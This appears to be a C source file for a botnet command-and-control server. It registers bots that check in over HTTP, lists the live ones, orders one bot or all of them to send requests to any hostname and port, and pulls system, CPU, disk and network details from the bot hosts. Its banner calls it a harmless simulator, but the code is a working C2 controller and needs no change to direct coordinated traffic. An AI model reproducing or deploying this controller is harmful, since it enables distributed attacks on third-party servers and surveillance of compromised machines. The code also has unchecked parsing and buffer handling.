#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "cJSON.h"
#include <time.h>
#include <pthread.h>
#include <curl/curl.h>
#define MAX_REQUEST_SIZE 1024
#define MAX_RESPONSE_SIZE 8192

void handle_get_request(int client_socket) {
    char response[] = "HTTP/1.1 200 OK\r\n"
                      "Content-Type: text/html\r\n\r\n"
                      "<html><body><h1>Hello, World!</h1></body></html>\r\n";
    send(client_socket, response, strlen(response), 0);
}

// Funzione per aggiornare il record del bot nel file "bots.txt"
void updateBotRecord(const char *clientIP, int port) {
    // Apri il file "bots.txt" in modalità append e lettura ("a+")
    FILE *file = fopen("bots.txt", "a+");
    if (file != NULL) {
        char line[1024];
        int found = 0;

        // Creare un nuovo file temporaneo
        FILE *tempFile = fopen("bots_temp.txt", "w");
        if (tempFile == NULL) {
            fclose(file);
            fprintf(stderr, "error creating 'bots_temp.txt'\n");
            return;
        }

        while (fgets(line, sizeof(line), file) != NULL) {
            char *timestamp = strtok(line, "|");
            char *address = strtok(NULL, "|");
            char *ports = strtok(NULL, "|");

            if (timestamp != NULL && address != NULL && ports != NULL) {
                if (strcmp(address, clientIP) == 0) {
                    // Trovato un record con lo stesso indirizzo IP, aggiorna la porta
                    found = 1;
                    time_t now;
                    time(&now);
                    struct tm *tm_info = localtime(&now);
                    char newTimestamp[20];
                    strftime(newTimestamp, sizeof(newTimestamp), "%Y-%m-%d %H:%M:%S", tm_info);
                    fprintf(tempFile, "%s|%s|%d\n", newTimestamp, clientIP, port);
                } else {
                    // Mantieni il record invariato
                    fprintf(tempFile, "%s|%s|%s", timestamp, address, ports);
                }
            }
        }

        if (!found) {
            // Se non è stato trovato un record corrispondente, aggiungilo
            time_t now;
            time(&now);
            struct tm *tm_info = localtime(&now);
            char timestamp[20];
            strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
            fprintf(tempFile, "%s|%s|%d\n", timestamp, clientIP, port);
        }

        // Chiudi entrambi i file
        fclose(file);
        fclose(tempFile);

        // Sostituisci il file originale con il file temporaneo
        if (remove("bots.txt") != 0) {
            fprintf(stderr, "file 'bots.txt' error\n");
        }
        if (rename("bots_temp.txt", "bots.txt") != 0) {
            fprintf(stderr, "file 'bots.txt' error\n");
        }
    } else {
        fprintf(stderr, "file 'bots.txt' error\n");
    }
}

// Funzione per scrivere la risposta HTTP in una stringa
static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    char *response = (char *)userp;

    if (realsize + 1 > MAX_RESPONSE_SIZE) {
        fprintf(stderr, "Response Too Big!\n");
        return 0;
    }

    memcpy(response, contents, realsize);
    response[realsize] = '\0'; // Aggiungi il terminatore null

    return realsize;
}
// Funzione per stampare le informazioni di sistema da un JSON
void printSystemInfo(const char *jsonStr) {
    // Analizza il JSON
    cJSON *json = cJSON_Parse(jsonStr);
    if (json == NULL) {
        fprintf(stderr, "error parsing JSON\n");
        return;
    }

    // Estrai e stampa le informazioni di sistema
    cJSON *infoRAMItem = cJSON_GetObjectItem(json, "infoRAM");
    cJSON *infoHDItem = cJSON_GetObjectItem(json, "infoHD");
    cJSON *infoOSItem = cJSON_GetObjectItem(json, "infoOS");
    cJSON *infoCPUItem = cJSON_GetObjectItem(json, "infoCPU");
    cJSON *infoNetworkItem = cJSON_GetObjectItem(json, "infoNetwork");

    if (infoRAMItem != NULL) {
        printf("Memory information:\n%s\n", infoRAMItem->valuestring);
    } else {
        printf("Memory information not available.\n");
    }

    if (infoHDItem != NULL) {
        printf("Hard drive information:\n%s\n", infoHDItem->valuestring);
    } else {
        printf("Hard drive information not available.\n");
    }

    if (infoOSItem != NULL) {
        printf("Operating System information:\n%s\n", infoOSItem->valuestring);
    } else {
        printf("Operating System information not available.\n");
    }

    if (infoCPUItem != NULL) {
        printf("CPU information:\n%s\n", infoCPUItem->valuestring);
    } else {
        printf("CPU information not available.\n");
    }

    if (infoNetworkItem != NULL) {
        printf("Network information:\n%s\n", infoNetworkItem->valuestring);
    } else {
        printf("Network information not available.\n");
    }

    cJSON_Delete(json);
}

// Funzione di scrittura personalizzata per cURL
size_t writeCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    // Ignora i dati ricevuti
    return size * nmemb;
}

void handle_post_request(int client_socket, char *data) {
    cJSON *json = cJSON_Parse(data);
    if (json == NULL) {
        char response[] = "HTTP/1.1 400 Bad Request\r\n\r\n";
        send(client_socket, response, strlen(response), 0);
        return;
    }

    cJSON *clientIPItem = cJSON_GetObjectItem(json, "clientIP");
    cJSON *portsArray = cJSON_GetObjectItem(json, "ports");

    if (!cJSON_HasObjectItem(json, "clientIP") || !cJSON_HasObjectItem(json, "ports") || !cJSON_IsArray(portsArray)) {
        // Se uno dei campi non è presente o "ports" non è un array, gestisci l'errore
        cJSON_Delete(json);
        char response[] = "HTTP/1.1 400 Bad Request\r\n\r\n";
        send(client_socket, response, strlen(response), 0);
        return;
    }

    char *clientIP = strdup(clientIPItem->valuestring);


    // Dichiara una variabile per la porta
    int port;

    // Ottenere le porte dall'array cJSON
    for (int i = 0; i < cJSON_GetArraySize(portsArray); i++) {
        cJSON *portItem = cJSON_GetArrayItem(portsArray, i);
        if (cJSON_IsNumber(portItem)) {
            port = portItem->valueint;
            // Chiamata per aggiornare o aggiungere il record del bot
            updateBotRecord(clientIP, port);
        }
    }

    // Prepara la risposta JSON
    cJSON *responseJson = cJSON_CreateObject();
    cJSON_AddStringToObject(responseJson, "message", "ok");
    cJSON_AddNumberToObject(responseJson, "status", 200);
    char *responseJsonStr = cJSON_Print(responseJson);
    cJSON_Delete(responseJson);

    // Invia la risposta JSON
    char responseHeader[512];
    sprintf(responseHeader, "HTTP/1.1 200 OK\r\n"
                            "Content-Type: application/json\r\n"
                            "Content-Length: %lu\r\n\r\n", strlen(responseJsonStr));
    send(client_socket, responseHeader, strlen(responseHeader), 0);
    send(client_socket, responseJsonStr, strlen(responseJsonStr), 0);
    free(responseJsonStr);

    // Libera la memoria allocata per clientIP
    free(clientIP);
}

// Funzione per inviare la richiesta a un bot specifico o a tutti i bot
void sendRequestToBot(const char *target, const char *requestJsonStr) {
    // Apri il file "bots.txt" in modalità di lettura
    FILE *file = fopen("bots.txt", "r");
    if (file == NULL) {
        printf("No connected bots currently.\n");
        return;
    }

    char line[1024];
    int currentBot = 0;

    // Cicla attraverso tutti i bot nel file bots.txt
    while (fgets(line, sizeof(line), file) != NULL) {
        currentBot++;
        char *timestamp = strtok(line, "|");
        char *ip = strtok(NULL, "|");
        char *portStr = strtok(NULL, "|");
        char responseData[4096];  // Dimensione massima della risposta
        memset(responseData, 0, sizeof(responseData));  // Inizializza la variabile

        if (ip != NULL && portStr != NULL) {
            int port = atoi(portStr);

            // Controlla se il target è un numero o un asterisco "*"
            if (strcmp(target, "*") == 0 || (atoi(target) == currentBot)) {
                // Invia la richiesta HTTP POST al bot corrente
                CURL *curl;
                CURLcode res;

                curl_global_init(CURL_GLOBAL_DEFAULT);

                curl = curl_easy_init();
                if (curl) {
                    // Crea l'URL con l'indirizzo IP e la porta
                    char url[100];
                    snprintf(url, sizeof(url), "http://%s:%d", ip, port);

                    // Imposta l'URL
                    curl_easy_setopt(curl, CURLOPT_URL, url);
                    // Imposta i dati JSON da inviare
                    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, requestJsonStr);
                    // Esegui la richiesta POST
                    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
                    // setto la response data
                    curl_easy_setopt(curl, CURLOPT_WRITEDATA, responseData);
                    // Esegui la richiesta POST
                    res = curl_easy_perform(curl);
                    if (res != CURLE_OK) {
                        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                    } else {
                        // Verifica il codice di stato HTTP della risposta
                        long http_code = 0;
                        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

                        if (http_code == 200) {
                            // La richiesta ha avuto successo, quindi non stampiamo il JSON ma rispondiamo con il messaggio
                            printf("Request sent by bot # %d\n", currentBot);
                        } else if (http_code == 500) {
                            // La richiesta ha generato un errore lato server
                            cJSON *responseJson = cJSON_Parse(responseData);
                            cJSON *errorItem = cJSON_GetObjectItem(responseJson, "error");
                            if (cJSON_IsString(errorItem)) {
                                // Stampa il messaggio di errore dal campo "error"
                                printf("Bot %d response: %s\n", currentBot, errorItem->valuestring);
                            } else {
                                printf("Errore lato server: Campo 'error' non valido nel JSON di risposta\n");
                            }
                            cJSON_Delete(responseJson);
                        } else {
                            // Gestire altri codici di stato HTTP se necessario
                            fprintf(stderr, "Http status code not managed: %ld\n", http_code);
                        }
                        // Chiudi la sessione CURL
                        curl_easy_cleanup(curl);
                    }
                }
                curl_global_cleanup();
            }
        } else {
            printf("Invalid format in bots.txt.\n");
        }
    }

    fclose(file);
}

// Funzione per inviare una richiesta a un bot specifico
void sendRequest(const char *command) {
    char hostname[256];
    char port[32];
    char target[32];

    if (sscanf(command + 8, "%255s %31s %31s", hostname, port, target) == 3) {
        // Creare il JSON per la richiesta
        cJSON *requestJson = cJSON_CreateObject();
        cJSON_AddStringToObject(requestJson, "command", "request");
        cJSON_AddStringToObject(requestJson, "hostname", hostname);
        cJSON_AddStringToObject(requestJson, "port", port);
        char *requestJsonStr = cJSON_Print(requestJson);
        cJSON_Delete(requestJson);

        // Invia la richiesta al bot corrispondente
        sendRequestToBot(target, requestJsonStr);

        // Libera la memoria allocata per requestJsonStr
        free(requestJsonStr);
    } else {
        printf("Invalid request format. Use 'request {hostname} {port}  {target}'.\n");
    }
}

int isBotListening(const char *address, int port) {
    struct sockaddr_in server_addr;
    int sockfd;

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, address, &server_addr.sin_addr) <= 0) {
        return 0;  // Non in ascolto (errore nell'indirizzo IP)
    }

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        return 0;  // Non in ascolto (errore nel socket)
    }

    // Imposta un timeout di 5 secondi
    struct timeval timeout;
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0) {
        close(sockfd);
        return 0;  // Non in ascolto (errore nel timeout)
    }

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
        // Connessione riuscita, chiudi il socket e restituisci 1
        close(sockfd);
        return 1;
    } else {
        close(sockfd);
        return 0;  // Non in ascolto (errore nella connessione)
    }
}

void getInfo(int commandNumber) {
    if (commandNumber <= 0) {
        printf("Invalid command number.\n");
        return;
    }

    // Apri il file "bots.txt" in modalità di lettura
    FILE *file = fopen("bots.txt", "r");
    if (file == NULL) {
        printf("Error opening bots.txt for reading.\n");
        return;
    }

    char line[1024];
    int currentCommandNumber = 0;

    // Cerca il comando corrispondente nel file bots.txt
    while (fgets(line, sizeof(line), file) != NULL) {
        currentCommandNumber++;
        if (currentCommandNumber == commandNumber) {
            char *timestamp = strtok(line, "|");
            char *ip = strtok(NULL, "|");
            char *portStr = strtok(NULL, "|");

            if (ip != NULL && portStr != NULL) {
                int port = atoi(portStr);

                // Invia la richiesta HTTP POST
                CURL *curl;
                CURLcode res;

                curl_global_init(CURL_GLOBAL_DEFAULT);

                curl = curl_easy_init();
                if (curl) {
                    // Crea il JSON
                    char json[100];
                    snprintf(json, sizeof(json), "{\"command\":\"get info\"}");

                    // Crea l'URL con l'indirizzo IP e la porta
                    char url[100];
                    snprintf(url, sizeof(url), "http://%s:%d", ip, port);

                    // Imposta l'URL
                    curl_easy_setopt(curl, CURLOPT_URL, url);

                    // Imposta i dati JSON da inviare
                    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);

                    // Inizializza responseString per memorizzare la risposta
                    char responseString[MAX_RESPONSE_SIZE]; // Assumi che MAX_RESPONSE_SIZE sia definito

                    // Imposta la callback per scrivere la risposta nella responseString
                    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
                    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&responseString);

                    // Esegui la richiesta POST
                    res = curl_easy_perform(curl);
                    if (res != CURLE_OK) {
                        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                    } else {
                        // Chiudi la sessione CURL
                        curl_easy_cleanup(curl);

                        // Chiamata per stampare le informazioni di sistema dalla risposta JSON
                        printSystemInfo(responseString);
                    }
                }

                curl_global_cleanup();

//                printf("Sent POST request to %s:%d\n", ip, port);
            } else {
                printf("Invalid format in bots.txt.\n");
            }
            break;
        }
    }

    fclose(file);
}

void printBotList() {
    // Apri il file "bots.txt" in modalità di lettura
    FILE *file = fopen("bots.txt", "r");
    if (file == NULL) {
        printf("No connected bots currently.\n");
        return;
    }

    char line[1024];
    char botAddresses[1024][1024];
    int botPorts[1024];
    int numBots = 0;

    // Leggi il file riga per riga
    while (fgets(line, sizeof(line), file) != NULL) {
        char *timestamp = strtok(line, "|");
        char *address = strtok(NULL, "|");
        char *ports = strtok(NULL, "|");

        if (timestamp != NULL && address != NULL && ports != NULL) {
            // Verifica se l'indirizzo IP è già presente nella lista
            int found = 0;
            for (int i = 0; i < numBots; i++) {
                if (strcmp(botAddresses[i], address) == 0) {
                    found = 1;
                    // Aggiorna la porta solo se è più recente
                    if (atoi(ports) > botPorts[i]) {
                        botPorts[i] = atoi(ports);
                    }
                    break;
                }
            }

            if (!found) {
                strcpy(botAddresses[numBots], address);
                botPorts[numBots] = atoi(ports);
                numBots++;
            }
        }
    }

    // Chiudi il file "bots.txt"
    fclose(file);

    if (numBots == 0) {
        printf("No connected bots currently.\n");
        return;
    }

    // Apri il file "list.txt" in modalità scrittura (sovrascrittura)
    FILE *listFile = fopen("list.txt", "w");
    if (listFile == NULL) {
        printf("Error opening list.txt for writing.\n");
        return;
    }

    // Stampa e scrivi la lista di indirizzi IP e porte più aggiornata
    int activeBotCount = 0;
    fprintf(listFile, "List of active bots with the most updated port numbers:\n");
    printf("List of active bots with the most updated port numbers:\n");
    for (int i = 0; i < numBots; i++) {
        if (isBotListening(botAddresses[i], botPorts[i])) {
            fprintf(listFile, "%d) %s %d\n", activeBotCount + 1, botAddresses[i], botPorts[i]);
            printf("%d) %s %d\n", activeBotCount + 1, botAddresses[i], botPorts[i]);
            activeBotCount++;
        }
    }

    // Chiudi il file "list.txt"
    fclose(listFile);
}

// Funzione del thread per la gestione dell'input dell'utente
void *user_input_thread(void *arg) {
    char command[1024];
    printf("Welcome to botnet!\n\nThis is a botnet simulator without any malicious purpose\n\nType 'list' for a detailed list of commands available\n\n");
    while (1) {
        printf("$ ");
        fflush(stdout);

        if (fgets(command, sizeof(command), stdin) == NULL) {
            break;  // Termina il loop in caso di errore o fine dell'input
        }

        // list command
        if (strcmp(command, "list\n") == 0) {
            // Eseguire un'azione di uscita o terminare il server
            printf("1) botnet\n get the list of ip and ports of active bots with specific target id.\n\n2) request {hostname} {port} {target}\n Send a request to a specified hostname and port via bot.\n Use wildcard * to send request from all botnet.\n Examples:\n  $ request localhost 5000 *\n  $ request localhost 5000 1\n\n3) get info {target}\n Receive hardware and software information about hosts connected to this botnet.\n\n");
        }
            // botnet command
        else if (strcmp(command, "botnet\n") == 0) {
            printBotList();
        }
            // get info command
        else if (strncmp(command, "get info ", 9) == 0) {
            int target = atoi(command + 9); // Estrai l'argomento numerico dopo "get info "

            // Esegui la funzione getInfo con l'ID del target
            getInfo(target);
        }
            // request command
        else if (strncmp(command, "request ", 8) == 0) {
            sendRequest(command);
        }
            // exit command
        else if (strcmp(command, "exit\n") == 0) {
            // Eseguire un'azione di uscita o terminare il server
            exit(0);
        }
    }

    return NULL;
}

int main(int argc, char *argv[]) {
    int PORT = 8081;
    // Verifica se è stato passato un argomento per la porta
    if (argc == 2) {
        PORT = atoi(argv[1]); // Converti l'argomento in un numero intero
    }
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    pthread_t user_input_thread_id; // ID del thread per la gestione dell'input dell'utente


    // Creazione del socket
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == -1) {
        perror("Errore nella creazione del socket");
        exit(EXIT_FAILURE);
    }

    // Configurazione dell'indirizzo del server
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    // Binding del socket all'indirizzo del server
    if (bind(server_socket, (struct sockaddr *) &server_addr, sizeof(server_addr)) == -1) {
        perror("Errore nel binding del socket");
        exit(EXIT_FAILURE);
    }

    // Inizio ad ascoltare le connessioni in entrata
    if (listen(server_socket, 5) == -1) {
        perror("Errore nell'ascolto delle connessioni in entrata");
        exit(EXIT_FAILURE);
    }

    printf("Server start on port %d\n\n", PORT);

    // Creazione del thread per la gestione dell'input dell'utente
    if (pthread_create(&user_input_thread_id, NULL, user_input_thread, NULL) != 0) {
        perror("Errore nella creazione del thread per l'input dell'utente");
        exit(EXIT_FAILURE);
    }

    //Loop principale del server
    while (1) {
        // Accetto una connessione in entrata
        client_socket = accept(server_socket, (struct sockaddr *) &client_addr, &client_addr_len);
        if (client_socket == -1) {
            perror("Errore nell'accettare la connessione del client");
            continue;
        }

        char request[MAX_REQUEST_SIZE];
        memset(request, 0, sizeof(request));

        // Leggo la richiesta del client
        if (recv(client_socket, request, sizeof(request), 0) == -1) {
            perror("Errore nella lettura della richiesta del client");
            close(client_socket);
            continue;
        }

        if (strstr(request, "GET") != NULL) {
            handle_get_request(client_socket);
        } else if (strstr(request, "POST") != NULL) {
            // Trova i dati POST (supponendo una richiesta semplice senza chunking)
            char *data = strstr(request, "\r\n\r\n") + 4;
            handle_post_request(client_socket, data);
        } else {
            // Gestione di altri tipi di richieste
            char response[] = "HTTP/1.1 501 Not Implemented\r\n\r\n";
            send(client_socket, response, strlen(response), 0);
        }

        // Chiudi la connessione con il client
        close(client_socket);
    }

    // Chiudi il socket del server
    close(server_socket);
    // Join del thread per la gestione dell'input dell'utente
    if (pthread_join(user_input_thread_id, NULL) != 0) {
        perror("Errore nel join del thread per l'input dell'utente");
        exit(EXIT_FAILURE);
    }

    return 0;
}
